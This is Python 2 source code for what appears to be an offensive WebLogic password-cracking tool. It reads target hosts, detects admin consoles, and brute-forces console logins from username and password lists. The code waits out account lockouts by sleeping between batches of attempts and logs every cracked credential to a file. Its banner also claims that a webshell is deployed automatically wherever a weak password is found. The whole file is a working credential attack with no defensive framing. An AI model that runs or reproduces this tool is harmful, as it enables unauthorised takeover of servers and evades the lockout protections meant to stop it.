#coding:gbk
#author:wolf@future-sec
import codecs,requests,time
import urllib2

UrlFile=file('./weblogic1.txt') #url列表
UserFile=file('./weblogic_user.txt') #用户名列表
PassFile=file('./sql_pass.txt') #密码列表
fp= codecs.open("./weblogic_success.txt","a") #成功利用后写入的文件，支持写入中文字符的方式
timeout=200
user_list=[]
pass_list=[]

while True:
    line = UserFile.readline()
    if len(line) == 0: # Zero length indicates EOF
        break
        #exit()             
    line=line.strip()
    #print line,
    user_list.append(line)

while True:
    line = PassFile.readline()
    if len(line) == 0: # Zero length indicates EOF
        break
        #exit()             
    line=line.strip()
    #print line,
    pass_list.append(line)
    
'''def check(host,port):
    if port=='443':
        url = "https://%s" %(host)
    else:
        url = "http://%s:%d" %(host,int(port))
    error_i=0
    res_code='404'
    flag_list=['<title>WebLogic Server Console</title>','javascript/console-help.js','WebLogic Server Administration Console Home','/console/console.portal','console/jsp/common/warnuserlockheld.jsp','/console/actions/common/']
    user_list=['weblogic']
    pass_list=['weblogic','password']
    try:
        res = urllib2.urlopen(url+"/console/login/LoginForm.jsp")
        cookies = res.headers['Set-Cookie']
    except Exception,e:
        print "\terro info1:",e
        return 0
    for user in user_list:
        for password in pass_list:
            try:
                PostStr='j_username=%s&j_password=%s&j_character_encoding=UTF-8'%(user,password)
                request = urllib2.Request(url+'/console/j_security_check',PostStr)
                request.add_header("Cookie",cookies)
                res = urllib2.urlopen(request,timeout=timeout)
                res_html = res.read()
                return 1
            except urllib2.HTTPError,e:
                return 0
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 0
                continue
            except Exception as e: #缺省错误返回0
                print "error info:",e
                return 0
    return 1
'''

def check(host,port):
    if port=='443':
        url = "https://%s" %(host)
    else:
        url = "http://%s:%d" %(host,int(port))
    try:
        r = requests.get(url+"/console/login/LoginForm.jsp",timeout=timeout)
        r.encoding = r.apparent_encoding #解决中文乱码的问题
        status=r.content.count('WebLogic')
        return status
    except Exception as e: #缺省错误返回0
        print "\terror info:",e
        return 0
        
        
def checkScan(host,port):
    if port=='443':
        url = "https://%s" %(host)
    else:
        url = "http://%s:%d" %(host,int(port)) 
    error_i=0
    res_code='404'
    z=0
    co=0
    flag_list=['<title>WebLogic Server Console</title>','javascript/console-help.js','WebLogic Server Administration Console Home','/console/console.portal','console/jsp/common/warnuserlockheld.jsp','/console/actions/common/']
    print "\t%s/console is living!" %(url)
    try:
        res = urllib2.urlopen(url+"/console/login/LoginForm.jsp")
        cookies = res.headers['Set-Cookie']
    except Exception,e:
        return 0
    for user in user_list:
        print "\tcurrent user [%s],pass's length [%d]" %(user,len(pass_list))
        for password in pass_list:
            try:
                z=z+1
                co=co+1
                if z == 6: #账户错误达到5次，此账户锁定30分钟，等待重试
                    print "\t"+' Waiting......'
                    ct=0
                    b=31
                    while (ct<b):
                        ncount=b-ct
                        ncount='%d' %ncount
                        print "\t"+i+" "+ncount+' min left'
                        time.sleep(60)
                        ct+=1
                    z=1 #重置计数
                PostStr='j_username=%s&j_password=%s&j_character_encoding=UTF-8'%(user,password)
                request = urllib2.Request(url+'/console/j_security_check',PostStr)
                request.add_header("Cookie",cookies)
                res = urllib2.urlopen(request,timeout=timeout)
                res_html = res.read()
            except urllib2.HTTPError,e:
                return 'NO'
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 'NO'
                continue
            except Exception as e: #缺省错误继续
                print"error info:",e
                pass
            for flag in flag_list:
                if flag in res_html:
                    info = '%s/console //Weblogic Weak password %s:%s\n'%(url,user,password)
                    print  '\tYES|'+info
                    fp.write(info)
                    fp.flush()
                    return 'YES|'+info
    return 'NO'

if __name__ == "__main__":
    print '''
    ----------------------------------------------------------------------------------------
        程序名称：weblogic弱口令破解程序v1.1,weblogic_crackpass.py
        程序作者：pt007@vip.sina.com
        程序用法：
    \tweblogic1.txt里面设置需要扫描的IP地址，如:10.110.123.30:8080 回车后输入下一个IP地址
    \tpython weblogic_crackpass.py
    \t扫描的结果会自动存入当前目录下的weblogic_success.txt文件!
    \t发现弱口令会自动部署webshell,http://IP:port/test11/top.jsp 
    -----------------------------------------------------------------------------------------\n'''
    urllist=[]
    print "\tweblogic url list:"
    while True:
        line = UrlFile.readline()
        if len(line) == 0: # Zero length indicates EOF
            break
            #exit()             
        line=line.strip()
        #print line,
        urllist.append(line)
    UrlFile.close()
    for i in urllist:
        host,port=i.split(":")
        icode=check(host,port)
        #print "\ticode=%s\n" %(icode)
        if icode:
            checkScan(host,port)
    UserFile.close()
    PassFile.close()
    print "\tCrack password done,please type weblogic_success.txt!\n"

    
